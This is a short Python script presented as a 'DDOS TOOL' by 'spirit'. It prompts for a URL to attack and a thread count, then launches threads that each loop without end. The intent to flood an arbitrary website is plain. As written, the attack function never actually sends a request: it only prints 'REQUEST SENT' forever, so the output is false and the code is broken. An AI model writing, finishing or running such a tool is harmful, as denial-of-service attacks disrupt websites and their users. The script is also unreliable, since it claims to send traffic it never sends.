import colorama
import threading
import requests

def dos(target):
    while True:
        try:
            print(colorama.Back.BLACK+colorama.Fore.GREEN+"REQUEST SENT") 
        except requests.exceptions.ConnectionError:
            print("Connection Error. Trying again...")
 
defaultThreads = 50

print(colorama.Back.BLACK+colorama.Fore.GREEN+"""DDOS TOOL""")

print(colorama.Back.BLACK+colorama.Fore.GREEN+'by spirit')
print(colorama.Back.BLACK+colorama.Fore.GREEN+'discord is spiritd3v')
url = input(colorama.Back.BLACK+colorama.Fore.GREEN+"enter the URL you would like to DDOS ==> ")
 
try:
    threads = int(input(colorama.Back.BLACK+colorama.Fore.GREEN+"Amount of Threads ==> "))
except ValueError:
    exit("Try again, threads count is incorrect.")
 
if threads == 0:
    exit("Cannot put 0 threads.")
 
if not url.__contains__("http"):
    exit("URL does not have HTTP or HTTPS in it, please try again.")
 
if not url.__contains__("."):
    exit("Invalid domain, try again.")
 
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(colorama.Back.BLACK+colorama.Fore.GREEN+str(i+1)+" threads started.")